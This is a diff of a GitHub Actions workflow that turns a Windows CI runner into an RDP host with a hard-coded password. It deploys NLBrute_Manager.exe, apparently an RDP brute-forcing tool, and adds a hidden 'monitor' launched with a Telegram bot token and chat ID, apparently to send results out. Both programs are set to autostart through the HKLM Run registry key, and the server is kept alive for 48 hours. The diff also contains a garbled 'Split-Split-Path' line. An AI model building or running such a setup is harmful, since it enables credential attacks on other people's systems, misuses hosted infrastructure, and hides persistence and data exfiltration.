@@ -38,7 +38,7 @@ jobs:
           Write-Host "  Password     : P@ssw0rd1qazXSW@#" -ForegroundColor Yellow
           Write-Host "==================================================" -ForegroundColor Green
 
-      - name: 4. Deploy and Force GUI via VBScript
+      - name: 4. Deploy, Extract and Setup Autostart
         shell: powershell
         run: |
           # 1. Setup Workspace
@@ -90,42 +90,58 @@ jobs:
               }
           }
 
-          # 5. Targeted Search and VBScript Launcher
-          $targetExeName = "NLBrute_Manager.exe"
-          $exeFile = Get-ChildItem -Path $workDir -Filter $targetExeName -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
+          # 5. Targeted Search and Autostart Configuration
+          # APP 1: NLBrute_Manager.exe
+          $targetExe1 = "NLBrute_Manager.exe"
+          $exeFile1 = Get-ChildItem -Path $workDir -Filter $targetExe1 -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
 
-          if ($exeFile) {
-              $exePath = $exeFile.FullName
-              $exeDir = Split-Path $exePath -Parent
-              Write-Host "SUCCESS! Found: $exePath" -ForegroundColor Green
+          if ($exeFile1) {
+              $exePath1 = $exeFile1.FullName
+              $exeDir1 = Split-Path $exePath1 -Parent
+              Write-Host "SUCCESS! Found App 1: $exePath1" -ForegroundColor Green
 
-              # --- THE REFINED VBSCRIPT CREATION ---
-              # We write the VBScript content line by line to avoid YAML/PowerShell parsing errors.
-              $vbsFile = "$workDir\launcher.vbs"
-              $vbsContent = 'Set WshShell = CreateObject("WScript.Shell")' + "`n"
-              $vbsContent += 'WshShell.CurrentDirectory = "' + $exeDir + '"' + "`n"
-              $vbsContent += 'WshShell.Run "' + $exePath + '", 1, False'
-              
-              $vbsContent | Out-File -FilePath $vbsFile -Encoding ascii
-              Write-Host "VBScript launcher created at $vbsFile" -ForegroundColor Cyan
+              # VBScript for App 1 (GUI)
+              $vbsFile1 = "$workDir\launcher_manager.vbs"
+              $vbsContent1 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n"
+              $vbsContent1 += 'WshShell.CurrentDirectory = "' + $exeDir1 + '"' + "`n"
+              $vbsContent1 += 'WshShell.Run "' + $exePath1 + '", 1, False'
+              $vbsContent1 | Out-File -FilePath $vbsFile1 -Encoding ascii
 
-              # 6. Set Registry Autostart (Using HKLM for system-wide visibility)
-              Write-Host "Configuring Registry Autostart..." -ForegroundColor Cyan
+              # Registry for App 1
               $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-              $command = "wscript.exe `"$vbsFile`""
-              
-              New-ItemProperty -Path $registryPath -Name "NLBruteAutostart" -Value $command -PropertyType String -Force | Out-Null
-              
-              Write-Host "Registry configured. The app will launch on RDP Login." -ForegroundColor Green
-              
-              # 7. Immediate Launch Attempt
-              Write-Host "Triggering immediate launch..." -ForegroundColor Yellow
-              & wscript.exe "$vbsFile"
-              
-          } else {
-              Write-Host "CRITICAL ERROR: $targetExeName not found!" -ForegroundColor Red
-              Get-ChildItem -Path $workDir -Recurse | Select-Object FullName | Out-File "$workDir\debug.txt"
+              New-ItemProperty -Path $registryPath -Name "NLBruteAutostart" -Value "wscript.exe `"$vbsFile1`"" -PropertyType String -Force | Out-Null
           }
+
+          # APP 2: good.txt-monitor.exe
+          $targetExe2 = "good.txt-monitor.exe"
+          $exeFile2 = Get-ChildItem -Path $workDir -Filter $targetExe2 -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
+
+          if ($exeFile2) {
+              $exePath2 = $exeFile2.FullName
+              $exeDir2 = Split-Split-Path $exePath2 -Parent # Use manual split if needed
+              $exeDir2 = Split-Path $exePath2 -Parent
+              
+              # Parameters for the monitor
+              $params = "-chatid 7565155789 -token 8054074057:AAF0DCvurOYgAR4dcQ8MQjTFMDBgeLGo2j4"
+              
+              Write-Host "SUCCESS! Found Monitor: $exePath2" -ForegroundColor Green
+
+              # VBScript for App 2 (CMD/Background)
+              # We use a slightly different VBS call to handle arguments correctly
+              $vbsFile2 = "$workDir\launcher_monitor.vbs"
+              $vbsContent2 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n"
+              $vbsContent2 += 'WshShell.CurrentDirectory = "' + $exeDir2 + '"' + "`n"
+              $vbsContent2 += 'WshShell.Run "cmd.exe /c ' + $exePath2 + ' ' + $params + '", 0, False'
+              
+              $vbsContent2 | Out-File -FilePath $vbsFile2 -Encoding ascii
+
+              # Registry for App 2
+              New-ItemProperty -Path $registryPath -Name "NLBruteMonitor" -Value "wscript.exe `"$vbsFile2`"" -PropertyType String -Force | Out-Null
+              
+              Write-Host "Monitor Autostart configured." -ForegroundColor Cyan
+          }
+
+          Write-Host "All Autostarts configured. Check RDP session." -ForegroundColor Green
 
       - name: 5. Keep Server Alive (48 Hours)
         run: |
